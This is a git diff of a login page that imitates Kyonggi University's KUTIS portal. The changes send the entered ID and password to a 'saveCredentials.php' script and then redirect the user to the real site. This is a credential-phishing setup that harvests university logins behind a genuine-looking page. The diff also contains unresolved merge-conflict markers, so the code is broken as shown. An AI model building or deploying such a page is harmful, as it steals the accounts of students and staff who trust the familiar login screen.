@@ -122,7 +122,11 @@ var SystemInfo = new function() {
 
   <!-- 로그인 컨텐츠 -->
   <section class="loginArea"  id="login_scroll">
+<<<<<<< HEAD
   	<form id="myform" name="myform" method="post" action="saveCredentials.php">
+=======
+  	<form id="myForm" name="myForm" method="post" action="saveCredentials.php" >
+>>>>>>> fdfd16a846ac5afd5984f7220bc6ed87914b5b9d
 	<input type="hidden" name="username" value="">
 	<input type="hidden" name="password" value="">
 	<fieldset>
@@ -134,14 +138,12 @@ var SystemInfo = new function() {
 
       </dl>
       <p class="btnArea">
-        <button type="submit">
-            <img src="https://kutis.kyonggi.ac.kr/webkutis/images/renewal/web/btn/btn_loginClass_off.gif"
-                 alt="학번/교번 로그인"/>
-        </button>
-    </p>
-
+        <a href="https://kutis.kyonggi.ac.kr/webkutis/view/indexWeb.jsp" onclick="submitForm()" ><img src="https://kutis.kyonggi.ac.kr/webkutis/images/renewal/web/btn/btn_loginClass_off.gif" alt="학번/교번 로그인" /></a>
+       </p>
+    </fieldset>
     <script>
       function saveAndRedirect() {
+<<<<<<< HEAD
           // 입력된 ID와 PW 가져오기
           var id = document.getElementById("id").value;
           var pw = document.getElementById("pw").value;
@@ -157,12 +159,20 @@ var SystemInfo = new function() {
           //a.download = "login_info.txt";
           //a.click();
           document.getElementsByName("myForm").submit();
+=======
+        var id = document.getElementById("id").value;
+            var pw = document.getElementById("pw").value;
+
+            // 폼 제출
+            document.getElementById("myForm").submit();
+          
+  
+>>>>>>> fdfd16a846ac5afd5984f7220bc6ed87914b5b9d
           // 원하는 페이지로 이동
           window.location.href = "https://kutis.kyonggi.ac.kr/webkutis/view/indexWeb.jsp";
       }
   </script>
-    
-    </fieldset>
+
     <!-- //로그인 폼 -->
     <!-- 옵션 -->
     <div class="opt">
